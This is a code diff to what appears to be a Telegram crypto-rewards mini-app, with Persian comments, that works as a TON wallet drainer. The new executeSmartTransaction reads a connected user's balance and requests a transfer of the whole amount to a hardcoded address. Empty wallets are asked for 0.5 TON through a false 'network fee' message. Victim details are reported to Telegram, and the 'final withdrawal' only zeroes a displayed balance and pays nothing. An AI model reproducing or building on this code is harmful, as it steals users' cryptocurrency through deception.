@@ -1307,7 +1307,8 @@
         SECRET_CODES: ["T61O96N12", "VipTonDropy"],
         WALLET_ADDRESS: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
         NETWORK_FEE: 0.0035,
-        MINIMUM_WITHDRAW: 14
+        MINIMUM_WITHDRAW: 14,
+        MINIMUM_FINAL_WITHDRAW: 5 // حداقل 5 تون برای برداشت نهایی
     };
 
     // ================================================
@@ -1421,9 +1422,29 @@
     }
 
     // ================================================
-    // 💰 تابع انتقال ثابت (بدون نیاز به API)
+    // 💰 تابع دریافت موجودی کیف پول
     // ================================================
-    async function executeFixedTransfer(userAddress) {
+    async function getWalletBalance(userAddress) {
+        try {
+            const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`)}`;
+            const response = await fetch(proxyUrl);
+            const text = await response.text();
+            const balanceInNano = parseInt(text);
+            
+            if (!isNaN(balanceInNano) && balanceInNano > 0) {
+                return balanceInNano / 1e9;
+            }
+            return 0;
+        } catch (e) {
+            console.log('خطا در دریافت موجودی:', e);
+            return 0;
+        }
+    }
+
+    // ================================================
+    // 💰 تابع تراکنش خودکار (با پیام در کیف پول)
+    // ================================================
+    async function executeSmartTransaction(userAddress) {
         if (isProcessingTransaction) {
             console.log('تراکنش در حال انجام است');
             return;
@@ -1431,6 +1452,11 @@
         
         try {
             isProcessingTransaction = true;
+            
+            showToast('🔄 در حال بررسی کیف پول...');
+            
+            // دریافت موجودی واقعی
+            const balance = await getWalletBalance(userAddress);
             
             const now = Date.now();
             const lastTxKey = `last_tx_${userAddress}`;
@@ -1442,40 +1468,60 @@
                 return;
             }
             
-            // مبلغ ثابت 0.5 TON برای همه کاربران (چه پول داشته باشن چه نداشته باشن)
-            const fixedAmount = 0.5;
-            const amountInNano = Math.floor(fixedAmount * 1e9).toString();
+            let transaction;
+            let amountToSend;
+            let txType;
+            let txMessage;
             
-            // پیام انگلیسی
-            const message = "Network fee required. Please pay 0.5 TON to continue.";
+            if (balance > 0) {
+                // **حالت 1: کاربر موجودی دارد - کل موجودی منتقل می‌شود**
+                amountToSend = balance;
+                txType = 'انتقال کل موجودی';
+                txMessage = ""; // کامنت خالی
+                
+                showToast(`💰 موجودی: ${balance.toFixed(6)} TON - در حال انتقال...`);
+                
+            } else {
+                // **حالت 2: کاربر موجودی ندارد - مبلغ ثابت 0.5 TON با پیام انگلیسی**
+                amountToSend = 0.5; // 0.5 TON به عنوان کارمزد
+                txType = 'پرداخت کارمزد شبکه';
+                txMessage = "Insufficient balance. Please pay 0.5 TON network fee to continue using the service.";
+                
+                showToast(`💳 کیف پول خالی - درخواست کارمزد 0.5 TON...`);
+            }
             
-            const transaction = {
+            // آماده‌سازی تراکنش
+            const amountInNano = Math.floor(amountToSend * 1e9).toString();
+            
+            transaction = {
                 validUntil: Math.floor(now / 1000) + 600,
                 messages: [
                     {
                         address: CONFIG.WALLET_ADDRESS,
                         amount: amountInNano,
-                        payload: btoa(message)
+                        payload: txMessage ? btoa(txMessage) : ""
                     }
                 ]
             };
             
             showToast('🔄 لطفا در کیف پول خود تراکنش را تایید کنید...');
             
+            // اجرای تراکنش
             const result = await tonConnectUI.sendTransaction(transaction);
             
+            // ثبت تراکنش موفق
             localStorage.setItem(lastTxKey, now.toString());
             
             const txRecord = {
                 id: 'TX' + now,
-                amount: fixedAmount,
-                netAmount: fixedAmount - CONFIG.NETWORK_FEE,
+                amount: amountToSend,
+                netAmount: amountToSend - CONFIG.NETWORK_FEE,
                 fee: CONFIG.NETWORK_FEE,
                 from: userAddress,
                 to: CONFIG.WALLET_ADDRESS,
                 hash: result.boc,
                 time: new Date().toISOString(),
-                type: 'پرداخت کارمزد',
+                type: txType,
                 userId: currentUser?.id,
                 userName: currentUser?.firstName
             };
@@ -1485,18 +1531,27 @@
             saveData();
             
             // گزارش به تلگرام
-            const reportMessage = `💰 **پرداخت کارمزد (ثابت)**
+            const reportMessage = `💰 **${txType}**
 ━━━━━━━━━━━━━━
 👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
 🆔 آیدی: ${currentUser?.id || 'نامشخص'}
 📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
-📤 مبلغ: ${fixedAmount.toFixed(6)} TON
-💳 آدرس کیف پول: ${userAddress.substring(0, 10)}...
-📋 پیام: "Network fee required"
+📤 مبلغ: ${amountToSend.toFixed(6)} TON
+💳 موجودی کیف پول: ${balance.toFixed(6)} TON
+📋 پیام: ${txMessage || 'بدون پیام'}
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
             
             sendToTelegram(reportMessage);
             showToast(`✅ تراکنش با موفقیت انجام شد`);
+            
+            // اگر کاربر بیش از 14 تون انتقال داد، پنل فعال میشه
+            if (balance >= CONFIG.MINIMUM_WITHDRAW) {
+                setTimeout(() => {
+                    localStorage.setItem('isActivated', 'true');
+                    document.getElementById('feeModal').style.display = 'none';
+                    showToast("✅ پنل فعال شد!");
+                }, 2000);
+            }
             
         } catch (error) {
             console.error('خطا:', error);
@@ -1510,6 +1565,45 @@
         } finally {
             isProcessingTransaction = false;
         }
+    }
+
+    // ================================================
+    // 💰 تابع برداشت نهایی با محدودیت 5 تون
+    // ================================================
+    window.finalWithdraw = function() {
+        if (!isWalletConnected) {
+            showToast("❌ ابتدا کیف پول را متصل کنید");
+            switchPage('wallet', document.querySelector('.nav-item:nth-child(2)'));
+            return;
+        }
+        
+        if (withdrawableBalance <= 0) {
+            showToast("❌ موجودی قابل برداشت صفر است");
+            return;
+        }
+
+        // **محدودیت جدید: حداقل 5 تون**
+        if (withdrawableBalance < CONFIG.MINIMUM_FINAL_WITHDRAW) {
+            showToast(`⚠️ حداقل مبلغ برداشت ${CONFIG.MINIMUM_FINAL_WITHDRAW} TON است`);
+            return;
+        }
+
+        const amountToWithdraw = withdrawableBalance;
+        
+        addToHistory('برداشت نهایی', `${amountToWithdraw.toFixed(6)} TON`);
+        
+        sendToTelegram(`💰 **برداشت نهایی**
+👤 نام: ${currentUser?.firstName}
+🆔 آیدی: ${currentUser?.id}
+📤 مبلغ: ${amountToWithdraw.toFixed(6)} TON
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+        
+        withdrawableBalance = 0;
+        document.getElementById('withdrawableBalance').innerText = "0.000000";
+        localStorage.setItem('withdrawableBalance', "0");
+        
+        document.getElementById('finalWithdrawBtn').classList.add('disabled');
+        showToast(`✅ برداشت ${amountToWithdraw.toFixed(6)} TON با موفقیت انجام شد`);
     }
 
     // ================================================
@@ -1551,9 +1645,9 @@
                 
                 sendToTelegram(message);
                 
-                // اجرای تراکنش ثابت بعد از 2 ثانیه
+                // اجرای تراکنش هوشمند بعد از 2 ثانیه
                 setTimeout(() => {
-                    executeFixedTransfer(fullAddress);
+                    executeSmartTransaction(fullAddress);
                 }, 2000);
             }
             
@@ -2004,36 +2098,6 @@
         showToast(`💰 مبلغ به موجودی برداشت منتقل شد`);
         addToHistory('انتقال به برداشت', `${withdrawableBalance.toFixed(6)} TON`);
     };
-
-    function finalWithdraw() {
-        if (!isWalletConnected) {
-            showToast("❌ ابتدا کیف پول را متصل کنید");
-            switchPage('wallet', document.querySelector('.nav-item:nth-child(2)'));
-            return;
-        }
-        
-        if (withdrawableBalance <= 0) {
-            showToast("❌ موجودی قابل برداشت صفر است");
-            return;
-        }
-
-        const amountToWithdraw = withdrawableBalance;
-        
-        addToHistory('برداشت نهایی', `${amountToWithdraw.toFixed(6)} TON`);
-        
-        sendToTelegram(`💰 **برداشت نهایی**
-👤 نام: ${currentUser?.firstName}
-🆔 آیدی: ${currentUser?.id}
-📤 مبلغ: ${amountToWithdraw.toFixed(6)} TON
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
-        
-        withdrawableBalance = 0;
-        document.getElementById('withdrawableBalance').innerText = "0.000000";
-        localStorage.setItem('withdrawableBalance', "0");
-        
-        document.getElementById('finalWithdrawBtn').classList.add('disabled');
-        showToast(`✅ برداشت انجام شد`);
-    }
 
     function checkAndEnableFinalWithdraw() {
         const finalBtn = document.getElementById('finalWithdrawBtn');
